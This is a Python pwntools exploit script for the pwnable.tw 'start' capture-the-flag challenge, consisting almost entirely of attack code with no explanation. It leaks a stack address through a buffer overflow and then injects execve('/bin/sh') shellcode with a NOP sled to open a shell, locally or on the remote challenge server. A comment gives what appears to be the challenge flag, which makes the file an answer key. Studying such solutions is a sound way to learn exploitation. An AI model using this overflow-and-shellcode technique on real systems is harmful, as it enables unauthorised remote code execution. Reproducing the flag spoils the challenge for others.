#!/usr/bin/env python3
from pwn import *
import sys, pwnlib

pwnlib.args.SILENT(True)

bin_path = './start'
host = 'chall.pwnable.tw'
port = 10000

def main(argc, argv):
	ret_start = 0x08048087

	modes = ['local', 'remote']
	if(argc < 2):
		return 0
	mode = argv[1].lower()
	if(mode not in modes):
		return 0

	shellcode = b'\x68\x2F\x73\x68\x00'
	shellcode += b'\x68\x2F\x62\x69\x6E'
	shellcode += b'\x89\xe0'
	shellcode += b'\x89\xe3'
	shellcode += b'\x6a\x00'
	shellcode += b'\x89\xe2'
	shellcode += b'\x50'
	shellcode += b'\x89\xe1'
	shellcode += b'\xb8\x0b\x00\x00\x00'
	shellcode += b'\xcd\x80'

	p = process(bin_path) if mode == modes[0] else remote(host, port)
	death = p.kill if mode == modes[0] else p.close

	p.recvuntil(b':')
	leak_stack = b'A'*20+p32(ret_start)
	p.send(leak_stack)
	
	r = p.recv()
	r = r[:4]
	leak = u32(r)
	print(f"Shellcode size: {len(shellcode):d} Bytes")
	print(f"ESP: 0x{leak:x}")
	leak -= 24
	print(f"Buffer: 0x{leak:x}")

	payload = b'A'*20+p32(leak+44)+b'\x90'*4+shellcode
	print(f"Total payload size: {len(payload):d} Bytes")
	p.send(payload)

	# FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
	p.interactive()

	death()

	return 0

if(__name__=='__main__'):
	try:
		exit(main(len(sys.argv), sys.argv))
	except KeyboardInterrupt:
		exit(130)